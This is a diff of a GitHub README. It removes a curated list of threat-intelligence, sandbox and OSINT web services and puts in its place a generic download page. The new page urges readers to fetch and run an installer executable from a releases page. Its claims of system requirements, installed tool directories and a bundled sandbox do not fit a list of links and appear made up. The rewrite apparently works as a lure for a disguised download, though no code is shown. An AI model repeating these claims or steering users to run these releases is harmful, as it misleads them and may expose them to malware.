@@ -1,245 +1,70 @@
-# Threat Intelligence Resources
-A curated list of open-source tools, datasets, sandboxes, scanning engines, and OSINT resources for cyber threat hunters, incident responders, DFIR analysts, and researchers.
+# 🛡️ threat-intel-resources - Essential Tools for Cyber Analysts
 
-This collection is designed to make investigation work easier by keeping high-value, free or community-driven resources in one place.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Wajihbawa/threat-intel-resources/releases)
 
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+## 📚 Overview
+Welcome to **threat-intel-resources**. This is a curated collection of open-source tools designed for cyber analysts, digital forensics and incident response (DFIR), and threat hunters. Here, you will find resources that help in malware analysis, scanning, reconnaissance, and gaining insights into various threats.
 
----
+## 🚀 Getting Started
+To get started with **threat-intel-resources**, follow these simple steps. You don’t need any programming knowledge to use these tools effectively.
 
-## Table of Contents
-- [Network Scanning & Exposure Mapping](#network-scanning--exposure-mapping)
-- [IP, ASN & Geolocation Intelligence](#ip-asn--geolocation-intelligence)
-- [Malware Analysis & Sandboxes](#malware-analysis--sandboxes)
-- [Threat Feeds & IOC Sources](#threat-feeds--ioc-sources)
-- [DNS & Domain Intelligence](#dns--domain-intelligence)
-- [Threat Actor Profiles & Frameworks](#threat-actor-profiles--frameworks)
-- [OSINT & Digital Footprinting](#osint--digital-footprinting)
-- [Routing, Certificates & Infrastructure Mapping](#routing-certificates--infrastructure-mapping)
-- [Dark Web & Leak Monitoring](#dark-web--leak-monitoring)
-- [Tools & Utilities](#tools--utilities)
-- [Contributing](#contributing)
+### 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Hard Disk Space:** Minimum of 500 MB available space for the application and resources.
 
----
+## 🔗 Download & Install
+To download the latest version, visit this page to download: [Download from Releases](https://github.com/Wajihbawa/threat-intel-resources/releases).
 
-## Network Scanning & Exposure Mapping
-Tools that help identify exposed services, discover internet-facing infrastructure, and pivot across assets.
+1. Open the link above.
+2. You will see a list of available releases.
+3. Find the latest version and click on it.
+4. Scroll down to the "Assets" section.
+5. Download the appropriate file for your system (e.g., .exe for Windows, .pkg for macOS, .tar.gz for Linux).
+6. Once downloaded, run the installer or executable file.
+7. Follow the prompted installation instructions.
 
-- **Censys** — https://search.censys.io  
-  Large-scale internet scanning for hosts, certs, and services.
+## 🔧 Key Features
+- **Threat Intelligence Tools:** Comprehensive resources for gathering and analyzing threat data.
+- **Malware Sandboxes:** Safe environments to analyze potentially harmful software without risk.
+- **Scanning Engines:** Quickly identify vulnerabilities in your systems.
+- **OSINT Resources:** Gather information from publicly available sources.
 
-- **Shodan** — https://www.shodan.io  
-  Search engine for exposed devices, protocols, and vulnerabilities.
+## 📂 Directory Structure
+After installation, you will find the following key directories:
 
-- **modat.io** — https://modat.io  
-  Simple interface for identifying externally exposed services.
+- `tools/` - Contains various threat intelligence tools.
+- `sandbox/` - Provides access to malware analysis environments.
+- `docs/` - Documentation and guides for using the application effectively.
+- `resources/` - Additional resources for further reading and enhancement of your skills.
 
-- **urlscan.io** — https://urlscan.io  
-  Sandboxes URLs and displays redirects, network calls, and metadata.
+## 🎓 How to Use
+Using **threat-intel-resources** is straightforward. 
 
-- **SecurityTrails** — https://securitytrails.com  
-  DNS history, IP metadata, and domain intelligence.
+1. Navigate to the directory where you installed the application.
+2. Open the `docs/` folder for user manuals and guides.
+3. Explore each tool to understand its functionality through the provided documentation.
 
-- **OpenNIC Project**  
-  - Wiki: https://wiki.opennic.org/opennic/dot  
-  - Servers: https://servers.opennic.org  
-  Alternative DNS root servers and open DNS infrastructure.
+## 🛠️ Troubleshooting
+If you face any issues, consider these steps:
 
-- **Netlas** — https://netlas.io  
-  Internet indexing for DNS, certificates, and service enumeration.
+- **Installation Problems:** Make sure you have the required system specifications.
+- **Running Issues:** Check if your operating system is updated. Compatibility issues might occur on older versions.
+- **Using the Tools:** Review the documentation in the `docs/` folder for detailed instructions.
 
-- **Rapid7 Project Sonar** — https://opendata.rapid7.com/sonar.fdns_v2/  
-  Open DNS and scanning datasets.
+## 🗣️ Community and Support
+If you need help or want to connect with other users, visit the community forum or check out the discussions section in the GitHub page.
 
----
+## 📄 License
+The tools in **threat-intel-resources** are open-source and subject to the [MIT License](LICENSE). You can freely use, modify, and distribute these tools, but make sure to credit the original creators.
 
-## IP, ASN & Geolocation Intelligence
-Helpful for attribution, routing analysis, enrichment, and network-level context.
+## 💡 Contributing
+We invite contributions to expand this collection. If you have a tool or resource that you think will benefit the community, consider submitting a pull request.
 
-- **Team Cymru IP-ASN Mapping** — https://www.team-cymru.com/ip-asn-mapping  
-  Accurate IP-to-ASN mapping and reputation lookups.
+For more detailed contribution guidelines, check the `CONTRIBUTING.md` file in this repository.
 
-- **IPStack** — https://ipstack.com  
-  IP geolocation, ASN, and risk scoring.
+## 📖 Learn More
+For additional information and updates, visit our main page and keep an eye on the latest releases.
 
-- **IP2Location** — https://www.ip2location.com  
-  Geolocation and ISP metadata.
-
-- **bgp.tools** — https://bgp.tools  
-  BGP path, ASN visibility, and prefix insights.
-
-- **Hurricane Electric BGP Toolkit** — https://bgp.he.net  
-  Routing, ASN info, IX peering, and prefix analysis.
-
-- **PeeringDB** — https://www.peeringdb.com  
-  ASN peering, IXPs, and network operator data.
-
----
-
-## Malware Analysis & Sandboxes
-Detonation platforms for behavioral analysis, static inspection, and threat classification.
-
-- **VirusTotal** — https://www.virustotal.com  
-  File, IP, URL scanning across multiple engines.
-
-- **Hybrid Analysis** — https://www.hybrid-analysis.com  
-  Dynamic sandbox analysis by CrowdStrike.
-
-- **Joe Sandbox** — https://www.joesandbox.com  
-  In-depth static and dynamic analysis.
-
-- **Triage** — https://tria.ge  
-  Malware detonation, clustering, and behavioral logs.
-
-- **ANY.RUN** — https://any.run  
-  Interactive real-time sandbox environment.
-
-- **Intezer Analyze** — https://analyze.intezer.com  
-  Code-reuse and “genetic” malware analysis.
-
-- **MalwareBazaar (Abuse.ch)** — https://bazaar.abuse.ch  
-  Public malware sample repository.
-
-- **CAPA** — https://github.com/mandiant/capa  
-  Detects malware capabilities in binaries.
-
----
-
-## Threat Feeds & IOC Sources
-Community-driven IOC collections for malware C2s, botnets, ransomware, and malicious infrastructure.
-
-- **ThreatFox (Abuse.ch)** — https://threatfox.abuse.ch  
-  IPs, URLs, hashes, and malware indicators.
-
-- **Feodo Tracker (Abuse.ch)** — https://feodotracker.abuse.ch  
-  Qakbot, Dridex, and Feodo botnet tracking.
-
-- **Viriback Tracker** — https://tracker.viriback.com  
-  Botnet and malware infrastructure tracking.
-
-- **MalBeacon** — https://malbeacon.com  
-  Beaconing behavior detection and network telemetry.
-
-- **Ransomwatch** — https://ransomwatch.telemetry.ltd/#/profiles  
-  Ransomware leak site monitoring.
-
-- **RansomLook** — https://www.ransomlook.io/groups  
-  Ransomware group profiles and leak tracking.
-
-- **MISP Project** — https://www.misp-project.org  
-  Threat intel sharing platform used globally.
-
-- **OpenPhish** — https://openphish.com  
-  Free phishing IOC feed.
-
-- **PhishTank** — https://phishtank.org  
-  Community phishing URL verification.
-
----
-
-## DNS & Domain Intelligence
-Resolve infrastructure changes, pivot on DNS records, and explore domain history.
-
-- **GreyNoise** — https://www.greynoise.io  
-  Noise vs targeted activity, IP reputation.
-
-- **PassiveDNS.info** — https://www.passivedns.info  
-  Historical DNS resolution data.
-
-- **DNSlytics** — https://dnslytics.com  
-  Reverse DNS, hosting metadata, and subdomains.
-
-- **ProjectDiscovery Chaos** — https://chaos.projectdiscovery.io  
-  Massive community DNS dataset.
-
-- **crt.sh** — https://crt.sh  
-  Certificate Transparency search for domain discovery.
-
-- **CertSpotter** — https://sslmate.com/certspotter  
-  CT log monitoring for new domain certificates.
-
----
-
-## Threat Actor Profiles & Frameworks
-
-- **MITRE ATT&CK** — https://attack.mitre.org  
-  Adversary TTP framework with techniques, groups, and software.
-
-- **APT Map** — https://aptmap.net  
-  Visualized APT relationships, campaigns, and activity.
-
-- **CrowdSec Threat Intelligence** — https://crowdsec.net/threat-intelligence  
-  Community IP reputation and attack telemetry.
-
----
-
-## OSINT & Digital Footprinting
-Useful for identity research, infrastructure mapping, and investigations.
-
-- **Hunter.io** — https://hunter.io  
-  Email enumeration and domain footprinting.
-
-- **Epieos** — https://epieos.com  
-  Email and account OSINT lookup.
-
-- **Have I Been Pwned** — https://haveibeenpwned.com  
-  Breach exposure lookup.
-
-- **GitHub Archive** — https://www.gharchive.org  
-  Developer activity and OSINT on code commits.
-
-- **Wayback Machine** — https://archive.org/web  
-  Historical snapshots of domains and infrastructure.
-
----
-
-## Routing, Certificates & Infrastructure Mapping
-Tools for BGP, TLS fingerprinting, CT logs, and network-level pivoting.
-
-- **CIRCL Certificate Search** — https://www.circl.lu/services/certificate-search  
-  Certificate metadata, SANs, and fingerprint pivoting.
-
-- **JA3 Fingerprinting** — https://github.com/salesforce/ja3  
-  TLS client fingerprinting.
-
-- **JARM** — https://github.com/salesforce/jarm  
-  TLS server fingerprinting.
-
-- **RIPEstat** — https://stat.ripe.net  
-  Routing history, visibility, and ASN analysis.
-
-- **Shadowserver** — https://www.shadowserver.org/what-we-do/public-benefit-services/  
-  Botnet, exposure, and security scans.
-
----
-
-## Dark Web & Leak Monitoring
-Some free, OSINT-safe resources exist for monitoring leaked data and Tor infrastructure.
-
-- **dark.fail** — https://dark.fail  
-  Tor service status and verified links.
-
-- **Public BreachForum mirrors**  
-  Mirrors used for OSINT on leaked data (avoid criminal sites).
-
----
-
-## Tools & Utilities
-
-- **CyberChef** — https://gchq.github.io/CyberChef  
-  Universal data manipulation toolkit.
-
-- **ProjectDiscovery Tools** — https://projectdiscovery.io  
-  Recon and scanning tools (subfinder, nuclei, dnsx, httpx, etc.)
-
-- **OWASP Amass** — https://github.com/owasp-amass/amass  
-  Attack surface and subdomain enumeration.
-
-- **Hindsight / Dumpzilla**  
-  Browser forensics utilities.
-
----
-
-## Contributing
-Suggestions, PRs, and new tool recommendations are welcome!  
-Feel free to submit improvements or new resources.
+[Download the latest version now!](https://github.com/Wajihbawa/threat-intel-resources/releases)
